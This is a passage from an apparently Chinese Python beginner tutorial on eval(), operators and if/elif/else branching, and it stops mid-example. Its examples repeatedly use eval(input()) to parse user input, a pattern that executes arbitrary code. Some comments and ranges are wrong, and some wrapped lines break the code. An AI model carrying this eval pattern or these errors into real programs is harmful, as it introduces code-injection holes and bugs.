进制之间的转换操作，十进制与其他进制之间的转换</span></span><span class="line"><span style="color: #abb2bf">print(&#39;十进制转成十六进制：&#39;, hex(23452))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;十进制转成八进制：&#39;, oct(23452))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;十进制转成二进制：&#39;, bin(23452))</span></span></code></pre></div></div></figure><h2 id="4-eval函数"><a href="#4-eval函数" class="headerlink" title="4.eval函数"></a>4.eval函数</h2><h3 id="1-eval函数："><a href="#1-eval函数：" class="headerlink" title="1.eval函数："></a>1.eval函数：</h3><ul><li>Python中的内置函数 </li><li>用于去掉字符串最外侧的引号，并按照Python语句方式去掉引号后的字符串 </li><li>eval（）函数经常和input（）函数一起使用</li></ul><h3 id="2-eval的语法格式"><a href="#2-eval的语法格式" class="headerlink" title="2.eval的语法格式"></a>2.eval的语法格式</h3><p>变量&#x3D;eval（字符串）</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例3-14eval函数的使用</span></span><span class="line"><span style="color: #abb2bf">s = &#39;3.14+3&#39;</span></span><span class="line"><span style="color: #abb2bf">print(s, type(s))</span></span><span class="line"><span style="color: #abb2bf">x = eval(s)  # 使用eval函数去掉s这个字符串中左右的引号，执行加法运算</span></span><span class="line"><span style="color: #abb2bf">print(x, type(x))</span></span><span class="line"><span style="color: #abb2bf"># eval函数经常与input()函数一起使用，用来获取用户输入的数值</span></span><span class="line"><span style="color: #abb2bf">age = eval(input(&#39;请输入您的年龄：&#39;))  # 将字符串类型转成了int类型，相当于int(age)</span></span><span class="line"><span style="color: #abb2bf">print(age, (type(age)))</span></span><span class="line"><span style="color: #abb2bf">height = eval(input(&#39;请输入您的身高：&#39;))</span></span><span class="line"><span style="color: #abb2bf">print(height, type(height))</span></span><span class="line"><span style="color: #abb2bf">hello = &#39;北京欢迎你&#39;</span></span><span class="line"><span style="color: #abb2bf">print(hello)</span></span><span class="line"><span style="color: #abb2bf">print(eval(&#39;hello&#39;))  # 输出了“北京欢迎你”</span></span><span class="line"><span style="color: #abb2bf"># print(eval(&#39;北京欢迎你&#39;)) #NameError: name &#39;北京欢迎你&#39; is not defined</span></span></code></pre></div></div></figure><h2 id="5-算术运算符"><a href="#5-算术运算符" class="headerlink" title="5.算术运算符"></a>5.算术运算符</h2><h3 id="算术运算符：用于处理四则运算的符号"><a href="#算术运算符：用于处理四则运算的符号" class="headerlink" title="算术运算符：用于处理四则运算的符号"></a>算术运算符：用于处理四则运算的符号</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170746132.png" alt="image-20251024142339587"></p><h3 id="算数运算符的优先级由高到低的是："><a href="#算数运算符的优先级由高到低的是：" class="headerlink" title="算数运算符的优先级由高到低的是："></a>算数运算符的优先级由高到低的是：</h3><p>第一级：**</p><p>第二级：*、&#x2F;、%、&#x2F;&#x2F; </p><p>第三级：+、-</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例3-15算数运算符的使用</span></span><span class="line"><span style="color: #abb2bf">print(&#39;加法&#39;,1+1)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;减法&#39;,1-1)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;乘法&#39;,2*3)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;除法&#39;,10/2)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;整除&#39;,10//3)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;取余&#39;,10%3)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;幂运算&#39;,2**4) # 2*2*2*2</span></span><span class="line"><span style="color: #abb2bf">print(10/0) # ZeroDivisionError: division by zero</span></span></code></pre></div></div></figure><h2 id="6-赋值运算符"><a href="#6-赋值运算符" class="headerlink" title="6.赋值运算符"></a>6.赋值运算符</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170743995.png" alt="image-20251024142422789"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例3-16赋值运算符的使用</span></span><span class="line"><span style="color: #abb2bf">x = 20  # 直接赋值，直接将20赋值给左侧的变量x</span></span><span class="line"><span style="color: #abb2bf">y = 10</span></span><span class="line"><span style="color: #abb2bf">x = x + y  # 将x+y的和赋值给x，x的值为30</span></span><span class="line"><span style="color: #abb2bf">print(x)  # x的值是30</span></span><span class="line"><span style="color: #abb2bf">x += y  # 40 相当于x=x+y</span></span><span class="line"><span style="color: #abb2bf">x -= x - y  # 相当于x=x-y</span></span><span class="line"><span style="color: #abb2bf">print(x)  # 30</span></span><span class="line"><span style="color: #abb2bf">x *= y</span></span><span class="line"><span style="color: #abb2bf">print(x)  # 300</span></span><span class="line"><span style="color: #abb2bf">x /= y</span></span><span class="line"><span style="color: #abb2bf">print(x)  # 30.0 发生了类型转换 x的数据类型为float类型</span></span><span class="line"><span style="color: #abb2bf">print(type(x))  # &lt;class &#39;float&#39;&gt;</span></span><span class="line"><span style="color: #abb2bf">x %= 2  # 相当于x=x%2</span></span><span class="line"><span style="color: #abb2bf">print(x)  # 0.0</span></span><span class="line"><span style="color: #abb2bf">z = 3</span></span><span class="line"><span style="color: #abb2bf">y //= z  # 相当于y=y//z</span></span><span class="line"><span style="color: #abb2bf">print(y)  # 3</span></span><span class="line"><span style="color: #abb2bf">y **= 2  # 相当于y=y**2</span></span><span class="line"><span style="color: #abb2bf">print(y)  # 9</span></span><span class="line"><span style="color: #abb2bf"># Python支持链式赋值</span></span><span class="line"><span style="color: #abb2bf">a = b = c = 100  # 相当于执行 a=100 b=100 c=100</span></span><span class="line"><span style="color: #abb2bf">print(a, b, c)</span></span><span class="line"><span style="color: #abb2bf"># Python支持系列解包赋值</span></span><span class="line"><span style="color: #abb2bf">a, b = 10, 20  # 相当于执行了a=10 b=20</span></span><span class="line"><span style="color: #abb2bf">print(a, b)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;----如何交换两个变量的值呢？----&#39;)</span></span><span class="line"><span style="color: #abb2bf">a, b = b, a  # 将b的值赋给a，将a的值赋给b</span></span><span class="line"><span style="color: #abb2bf">print(a, b)</span></span></code></pre></div></div></figure><h2 id="7-比较运算符"><a href="#7-比较运算符" class="headerlink" title="7.比较运算符"></a>7.比较运算符</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170749996.png" alt="image-20251024142447404"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例3-17比较运算符的使用</span></span><span class="line"><span style="color: #abb2bf">print(&#39;98大于90吗？&#39;,98&gt;90)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;98小于90吗？&#39;,98&lt;90)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;98等于90吗？&#39;,98==90)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;98不等于90吗？&#39;,98!=90)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;98大于等于90吗？&#39;,98&gt;=90)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;98小于等于90吗？&#39;,98&lt;=90)</span></span></code></pre></div></div></figure><h2 id="8-逻辑运算符"><a href="#8-逻辑运算符" class="headerlink" title="8.逻辑运算符"></a>8.逻辑运算符</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170751621.png" alt="image-20251024142503907"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例3-18逻辑运算符的使用</span></span><span class="line"><span style="color: #abb2bf">print(True and True)</span></span><span class="line"><span style="color: #abb2bf">print(True and False)</span></span><span class="line"><span style="color: #abb2bf">print(False and False)</span></span><span class="line"><span style="color: #abb2bf">print(False and True)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;-&#39;*30)</span></span><span class="line"><span style="color: #abb2bf">print(8 &gt; 7 and 6 &gt; 5)  # True</span></span><span class="line"><span style="color: #abb2bf">print(8 &gt; 7 and 6 &lt; 5)  # False</span></span><span class="line"><span style="color: #abb2bf">print(8 &lt; 7 and 10 &lt; 0)  #False,10/0并没有运算，当第一个表达式的结果为False，直接得</span></span><span class="line"><span style="color: #abb2bf">结果，不会计算and右侧的表达式了</span></span><span class="line"><span style="color: #abb2bf">print(&#39;-&#39;*30)</span></span><span class="line"><span style="color: #abb2bf">print(True or True)</span></span><span class="line"><span style="color: #abb2bf">print(True or False)</span></span><span class="line"><span style="color: #abb2bf">print(False or False) #False</span></span><span class="line"><span style="color: #abb2bf">print(False or True)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;-&#39;*30)</span></span><span class="line"><span style="color: #abb2bf">print(8&gt;7 or 10/0) #True,表达式结果为True时，or的右侧表达式根本不执行运算符</span></span><span class="line"><span style="color: #abb2bf">print(&#39;-&#39;*30)</span></span><span class="line"><span style="color: #abb2bf">print(not True) #False</span></span><span class="line"><span style="color: #abb2bf">print(not False) #True</span></span><span class="line"><span style="color: #abb2bf">print(not (8&gt;7))</span></span></code></pre></div></div></figure><h2 id="9-位运算符"><a href="#9-位运算符" class="headerlink" title="9.位运算符"></a>9.位运算符</h2><h3 id="1-位运算符："><a href="#1-位运算符：" class="headerlink" title="1.位运算符："></a>1.位运算符：</h3><p>把数字看作二进制数来进行计算的</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170755625.png" alt="image-20251024142531892"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170754819.png" alt="image-20251024142534282"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170758224.png" alt="image-20251024142540337"></p><h3 id="2-“左移位”运算（"><a href="#2-“左移位”运算（" class="headerlink" title="2.“左移位”运算（&lt;&lt;）"></a>2.“左移位”运算（&lt;&lt;）</h3><p>是将一个二进制数向左移动指定的位数，左边（高位端）溢出的位被丢弃，右边（低位端）的空位用0补充</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170759775.png" alt="image-20251024142601879"></p><h3 id="3-“右移位”运算（"><a href="#3-“右移位”运算（" class="headerlink" title="3.“右移位”运算（&lt;&lt;）"></a>3.“右移位”运算（&lt;&lt;）</h3><p>将一个二进制数向右移动指定的位数，右边（低位端）溢出的位被丢弃，左边（高位端）的空位端，如 果最高位是0（正数）左侧空位填0，如果最高位是1（负数），左侧空位填1。</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170801706.png" alt="image-20251024142619061"></p><h3 id="4-运算符的优先级"><a href="#4-运算符的优先级" class="headerlink" title="4.运算符的优先级"></a>4.运算符的优先级</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170803173.png" alt="image-20251024142629337"></p><h2 id="10-第三章本章总结"><a href="#10-第三章本章总结" class="headerlink" title="10.第三章本章总结"></a>10.第三章本章总结</h2><ul><li>保留字是Python已经被赋予特定意义的一些单词，保留字严格区分大小写</li><li>标识符可用来给变量、函数、类、模块和其他对象命名 </li><li>标识符的命名规则： <ul><li>可以是字母（包含中文）、数字、下划线，第一个字符不能是数字 </li><li>不能是Python中的保留字 </li><li>标识符严格区分大小写 </li><li>以下划线开头的标识符有特殊意义，不能随便使用 </li><li>允许使用中文作为标识符，但不建议使用</li></ul></li><li>变量的语法结构： 变量名&#x3D;value </li><li>整数类型有四种表示形式：二进制、八进制、十进制和十六进制 </li><li>浮点数可以使用内置函数round()限定运算结果需要保留的小数位数 </li><li>字符串又称为不可变字符序列，可根据索引检索元素，也可根据索引引进行切片操作 </li><li>布尔类型有两种取值True和False </li><li>常用的数据类型转换函数为int()、float()和str() </li><li>内置函数eval()可接字符串转换成真实的数据类型 </li><li>算术运算符：+、-、＊、&#x2F;、&#x2F;&#x2F;、%、**</li><li>赋值运算符：&#x3D;、+&#x3D;、-&#x3D;、*&#x3D;、&#x2F;&#x3D;、&#x2F;&#x2F;&#x3D;、%&#x3D;、**&#x3D; </li><li>比较运算符：&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、&#x3D;&#x3D;、!&#x3D; </li><li>逻辑运算符：and、or、not 位运算符：&amp;、|、Λ、~、&lt;&lt;、&gt;&gt;</li></ul><h1 id="第四章-程序的流程控制"><a href="#第四章-程序的流程控制" class="headerlink" title="第四章 程序的流程控制"></a>第四章 程序的流程控制</h1><h2 id="1-本章目标-1"><a href="#1-本章目标-1" class="headerlink" title="1.本章目标"></a>1.本章目标</h2><ul><li>了解程序的描述方式 </li><li>了解程序的组织结构 </li><li>掌握顺序结构 </li><li>掌握循环结构for与while </li><li>掌握程序跳转语句break和continue </li><li>掌握pass空语句</li></ul><h2 id="2-程序描述的方式"><a href="#2-程序描述的方式" class="headerlink" title="2.程序描述的方式"></a>2.程序描述的方式</h2><h3 id="1-自然语言"><a href="#1-自然语言" class="headerlink" title="1.自然语言"></a>1.自然语言</h3><p>自然语言就是使用人类语言、直接描述程序</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170810570.png" alt="image-20251024142909937"></p><h3 id="2-流程图"><a href="#2-流程图" class="headerlink" title="2.流程图"></a>2.流程图</h3><p>流程图是用一系列图形、流程线和文字说明描述程序的基本操作和控制流程主要适用于较短的算法</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170815148.png" alt="image-20251024142930308"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170816437.png" alt="image-20251024142933427"></p><h3 id="3-伪代码"><a href="#3-伪代码" class="headerlink" title="3.伪代码"></a>3.伪代码</h3><p>伪代码是介于自然语言和编程语言之间的一种算法描述语言，如果程序比较小，可以直接使用代码描述</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170820358.png" alt="image-20251024142956721"></p><h2 id="3-程序的组织结构"><a href="#3-程序的组织结构" class="headerlink" title="3.程序的组织结构"></a>3.程序的组织结构</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170821996.png" alt="image-20251024143008574"></p><h3 id="1-顺序结构"><a href="#1-顺序结构" class="headerlink" title="1.顺序结构"></a>1.顺序结构</h3><p>顺序结构按程序语句的自然顺序，从上到下，依次执行每条语句的程序</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170825483.png" alt="image-20251024143024439"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例4-1顺序结构的语句</span></span><span class="line"><span style="color: #abb2bf"># 赋值运算符的顺序 从右到左</span></span><span class="line"><span style="color: #abb2bf">name=&#39;张三&#39;</span></span><span class="line"><span style="color: #abb2bf">age=20</span></span><span class="line"><span style="color: #abb2bf">a=b=c=d=100 # 链式赋值</span></span><span class="line"><span style="color: #abb2bf">a,b,c,d=&#39;room&#39;# 字符中分解值</span></span><span class="line"><span style="color: #abb2bf">print(a)</span></span><span class="line"><span style="color: #abb2bf">print(b)</span></span><span class="line"><span style="color: #abb2bf">print(c)</span></span><span class="line"><span style="color: #abb2bf">print(d)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;---------输入/输出语句也是典型的顺序结构----------&#39;)</span></span><span class="line"><span style="color: #abb2bf">name=input(&#39;请输入您的姓名:&#39;)</span></span><span class="line"><span style="color: #abb2bf">age=eval(input(&#39;请输入您的年龄：&#39;))</span></span><span class="line"><span style="color: #abb2bf">luck_number=eval(input(&#39;请输入您的幸运数字：&#39;))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;姓名：&#39;,name)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;年龄：&#39;,age)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;幸运数字：&#39;,luck_number)</span></span></code></pre></div></div></figure><h3 id="2-选择结构"><a href="#2-选择结构" class="headerlink" title="2.选择结构"></a>2.选择结构</h3><p>选择结构也称分支结构，是按照条件选择执行不同的代码段</p><h4 id="1-单分支结构if的语法结构"><a href="#1-单分支结构if的语法结构" class="headerlink" title="1.单分支结构if的语法结构"></a>1.单分支结构if的语法结构</h4><p>if 表达式： </p><p>​语句块</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170828021.png" alt="image-20251024143102285"></p><p>执行流程：</p><p>如果表达式的值为True，就执行语句快，如果表达式的值为False，就跳过语句块，继续执行后面的代码</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例4-2单分支结构if</span></span><span class="line"><span style="color: #abb2bf">number = eval(input(&#39;请输入您的6位中奖号码：&#39;))</span></span><span class="line"><span style="color: #abb2bf"># 使用if语句</span></span><span class="line"><span style="color: #abb2bf">if number == 987654:  # 等值判断</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;恭喜您，中奖了!&#39;)</span></span><span class="line"><span style="color: #abb2bf">if number != 987654:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;您未中本期大奖&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;-----以上if判新的表达式，是通过比较运算符计算出来的，结果是布尔值类型----&#39;)</span></span><span class="line"><span style="color: #abb2bf">n = 98  # 赋值操作</span></span><span class="line"><span style="color: #abb2bf">if n % 2:  # 98%2的余数是0，0的布尔值是FaLse，非0的布尔值为True</span></span><span class="line"><span style="color: #abb2bf">    print(n, &#39;是奇数&#39;)  # 由于98%2的余数是0，所以该行代码不执行</span></span><span class="line"><span style="color: #abb2bf">if not n % 2:  # 98%2的余数是0，0的布尔值是FaLse，not FaLse的结采为True</span></span><span class="line"><span style="color: #abb2bf">    print(n, &#39;为偶数&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;------判断一个字符串是否是空字符串----&#39;)</span></span><span class="line"><span style="color: #abb2bf">x = input(&#39;请输入一个字符串：&#39;)</span></span><span class="line"><span style="color: #abb2bf">if x:  # 在Python中一切皆对象，每个对象都有一个布尔值，而非空字符串的布尔值为True，空字</span></span><span class="line"><span style="color: #abb2bf">符串的布尔值为False</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;x是一个非空字符串&#39;)</span></span><span class="line"><span style="color: #abb2bf">if not x:  # 空字符中的布尔值为False,取反，not FaLse的结采为True</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;x是一个空字符串&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;----表达式也可以是一个单纯的布尔型变量------&#39;)</span></span><span class="line"><span style="color: #abb2bf">flag = eval(input(&#39;请输入一个布尔类型的值：True或False&#39;))</span></span><span class="line"><span style="color: #abb2bf">if flag:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;flag的值为True&#39;)</span></span><span class="line"><span style="color: #abb2bf">if not flag:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;flag的值为False&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;-----使用if语句时，如果语句块中只有一句代码，可以将语句块直接写在冒号的后面------</span></span><span class="line"><span style="color: #abb2bf">&#39;)</span></span><span class="line"><span style="color: #abb2bf">a = 10</span></span><span class="line"><span style="color: #abb2bf">b = 5</span></span><span class="line"><span style="color: #abb2bf">if a &gt; b: max = a  # 语句块只有一句，赋最大值</span></span><span class="line"><span style="color: #abb2bf">print(&#39;a和b的最大值为：&#39;,max)</span></span></code></pre></div></div></figure><h4 id="2-双分支结构if…else…语法结构"><a href="#2-双分支结构if…else…语法结构" class="headerlink" title="2.双分支结构if…else…语法结构"></a>2.双分支结构if…else…语法结构</h4><p>if 表达式： </p><p>​语句1 </p><p>else： </p><p>​语句2</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170831769.png" alt="image-20251024143155181"></p><p>执行流程:</p><p>如果表达式的值为True，就执行语句1，否则就执行语句2</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 双分支结构if…else…</span></span><span class="line"><span style="color: #abb2bf">number = eval(input(&#39;请输入您的6位中奖号码：&#39;))</span></span><span class="line"><span style="color: #abb2bf"># if…else…</span></span><span class="line"><span style="color: #abb2bf">if number == 987654:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;恭喜您中奖了!&#39;)</span></span><span class="line"><span style="color: #abb2bf">else:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;您未中本期大奖&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;------以上代码可以使用条件表达式进行简化---&#39;)</span></span><span class="line"><span style="color: #abb2bf">result=&#39;恭喜您中奖了!&#39; if number == 987654 else &#39;您未中本期大奖&#39;</span></span><span class="line"><span style="color: #abb2bf">print(result)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;恭喜您中奖了!&#39; if number == 987654 else &#39;您未中本期大奖&#39;)</span></span></code></pre></div></div></figure><h4 id="3-多分支语法结构"><a href="#3-多分支语法结构" class="headerlink" title="3.多分支语法结构"></a>3.多分支语法结构</h4><p>if 表达式1：  </p><p>​语句块1 </p><p>elif 表达式2： </p><p>​语句块2 </p><p>elif 表达式n：</p><pre><code> 语句块n </code></pre><p>else: </p><p>​语句块n+1</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170834362.png" alt="image-20251024143306529"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例4-4多分支结构的使用</span></span><span class="line"><span style="color: #abb2bf">score=eval(input(&#39;请输入您的成绩：&#39;))</span></span><span class="line"><span style="color: #abb2bf"># 多分支结构</span></span><span class="line"><span style="color: #abb2bf">if score&lt;0 or score&gt;100:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;成绩有误！&#39;)</span></span><span class="line"><span style="color: #abb2bf">elif 0&lt;=score&lt;60:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;E&#39;)</span></span><span class="line"><span style="color: #abb2bf">elif 68&lt;=score&lt;70:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;D&#39;)</span></span><span class="line"><span style="color: #abb2bf">elif 70&lt;=score&lt;80:</span></span><span class="line"><span style="color: #abb2bf"> print(&#39;C&#39;)</span></span><span class="line"><span style="color: #abb2bf">elif 80&lt;=score&lt;=90:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;B&#39;)</span></span><span class="line"><span style="color: #abb2bf">else:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;A&#39;)</span></span></code></pre></div></div></figure><p>单分支结构、双分支结构和多分支结构在实际开发中是可以互相嵌套使用的，内层的分支结构将作为外 层分支结构的语句块使用</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170836539.png" alt="image-20251024143331562"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例4-5嵌套if的使用</span></span><span class="line"><span style="color: #abb2bf">answer=input(&#39;请问您喝酒了吗？&#39;)</span></span><span class="line"><span style="color: #abb2bf">if answer==&#39;y&#39;: #answer的值为y表示喝酒了</span></span><span class="line"><span style="color: #abb2bf">    proof=eval(input(&#39;请输入酒精含量：&#39;))</span></span><span class="line"><span style="color: #abb2bf">    if proof&lt;20:</span></span><span class="line"><span style="color: #abb2bf">        print(&#39;构不成酒驾，祝你一路平安&#39;)</span></span><span class="line"><span style="color: #abb2bf">    elif proof&lt;80: # 20&lt;=proof&lt;80</span></span><span class="line"><span style="color: #abb2bf">        print(&#39;已构成酒驾，请不要开车&#39;)</span></span><span class="line"><span style="color: #abb2bf">    else:</span></span><span class="line"><span style="color: #abb2bf">        print(&#39;已构成醉驾，请不要开车车！&#39;)</span></span><span class="line"><span style="color: #abb2bf">else:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;你走吧，没你啥事儿！&#39;)</span></span></code></pre></div></div></figure><p>在使用and连接多个判断条件时，只有同时满足多个条件，才能执行if后面的语句块。</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170838442.png" alt="image-20251024143346814"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例4-6使用and连接多个选择条件</span></span><span class="line"><span style="color: #abb2bf">user_name=input(&#39;请输入你的用户名：&#39;)</span></span><span class="line"><span style="color: #abb2bf">pwd=input(&#39;请输入你的密码：&#39;)</span></span><span class="line"><span style="color: #abb2bf">if user_name==&#39;aaaa&#39; and pwd==&#39;888888&#39;:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;登录成功！&#39;)</span></span><span class="line"><span style="color: #abb2bf">else:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;用户名或密码不正确&#39;)</span></span><span class="line"><span style="color: #abb2bf">    